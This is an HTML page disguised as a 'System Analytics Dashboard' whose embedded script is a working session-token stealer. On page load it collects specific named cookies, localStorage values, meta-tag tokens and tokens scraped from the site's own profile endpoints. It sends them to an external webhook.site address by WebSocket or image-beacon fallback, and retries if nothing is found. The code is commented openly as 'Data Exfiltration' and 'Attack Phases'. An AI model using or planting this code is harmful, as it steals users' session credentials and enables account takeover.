<!DOCTYPE html>
<html>
<head>
    <title>System Analytics Dashboard</title>
    <!-- Removed CSP for testing (add back in production) -->
    <style>
        body { visibility: hidden; }
    </style>
</head>
<body>
    <h1>Loading Dashboard...</h1>
    <script>
    // Debug mode (check browser console: F12 â†’ Console)
    const DEBUG = true;
    const TARGET_TOKENS = [
        'newopkey',
        'obus-track_116800_session',
        'opkey',
        'otrack_jssdk_is_first_day',
        'otrack_jssdk_store_116800',
        'sessionKey'
    ];

    // ======================
    // 1. Data Exfiltration
    // ======================
    const exfiltrate = (data) => {
        if (DEBUG) console.log("[DEBUG] Exfiltrating:", data);

        // Method 1: WebSocket (CORS bypass)
        try {
            const wsUrl = `wss://${location.hostname.replace('www', 'ws')}/collect`;
            const ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                ws.send(JSON.stringify(data));
                ws.close();
            };
            
            ws.onerror = (e) => {
                if (DEBUG) console.error("[DEBUG] WebSocket failed, falling back to image beacon");
                sendViaImage(data);
            };
        } catch (e) {
            if (DEBUG) console.error("[DEBUG] WebSocket error:", e);
            sendViaImage(data);
        }
    };

    // Fallback: Image beacon
    const sendViaImage = (data) => {
        const webhookUrl = "https://webhook.site/3001750c-2a5d-46a5-b7f0-5ebdb566f16a";
        const encodedData = encodeURIComponent(JSON.stringify(data));
        new Image().src = `${webhookUrl}?data=${encodedData}`;
    };

    // ======================
    // 2. Attack Phases
    // ======================
    const attack = async () => {
        if (DEBUG) console.log("[DEBUG] Starting attack sequence...");
        let foundTokens = false;

        // Phase 1: Harvest Cookies
        const cookies = {};
        document.cookie.split(';').forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            if (TARGET_TOKENS.includes(name)) {
                cookies[name] = value;
                foundTokens = true;
            }
        });
        if (Object.keys(cookies).length > 0) {
            exfiltrate({ type: "cookies", data: cookies });
        }

        // Phase 2: Check LocalStorage
        const storageData = {};
        TARGET_TOKENS.forEach(key => {
            const value = localStorage.getItem(key);
            if (value) {
                storageData[key] = value;
                foundTokens = true;
            }
        });
        if (Object.keys(storageData).length > 0) {
            exfiltrate({ type: "localStorage", data: storageData });
        }

        // Phase 3: Probe API Endpoints
        const endpoints = [
            '/v2/profile.html',
            '/v2/index.html',
            '/user/profile.json'
        ];

        for (const endpoint of endpoints) {
            try {
                const response = await fetch(endpoint, { 
                    headers: { 'X-Requested-With': 'XMLHttpRequest' } 
                });
                const text = await response.text();
                
                const foundTokens = {};
                TARGET_TOKENS.forEach(token => {
                    const regex = new RegExp(`"${token}":"([^"]+)"`);
                    const match = text.match(regex);
                    if (match) foundTokens[token] = match[1];
                });

                if (Object.keys(foundTokens).length > 0) {
                    exfiltrate({ 
                        type: "api_response", 
                        endpoint, 
                        tokens: foundTokens 
                    });
                }
            } catch (e) {
                if (DEBUG) console.error(`[DEBUG] Failed to fetch ${endpoint}:`, e);
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Phase 4: Scan DOM for Tokens
        const domTokens = {};
        TARGET_TOKENS.forEach(token => {
            const metaTag = document.querySelector(`meta[name="${token}"]`);
            if (metaTag) {
                domTokens[token] = metaTag.content;
                foundTokens = true;
            }
        });
        if (Object.keys(domTokens).length > 0) {
            exfiltrate({ type: "dom", data: domTokens });
        }

        // Update flag if tokens found
        window.sessionTokensFound = foundTokens;
    };

    // ======================
    // 3. Execution
    // ======================
    // Show page immediately (avoid blank screen)
    document.body.style.visibility = "visible";
    
    // Start attack after 500ms delay
    setTimeout(() => {
        attack().catch(e => {
            if (DEBUG) console.error("[DEBUG] Attack failed:", e);
        });
    }, 500);

    // Retry after 5s if no tokens found
    setTimeout(() => {
        if (!window.sessionTokensFound) {
            if (DEBUG) console.log("[DEBUG] Retrying attack...");
            attack().catch(e => {
                if (DEBUG) console.error("[DEBUG] Retry failed:", e);
            });
        }
    }, 5000);
    </script>
</body>
</html>
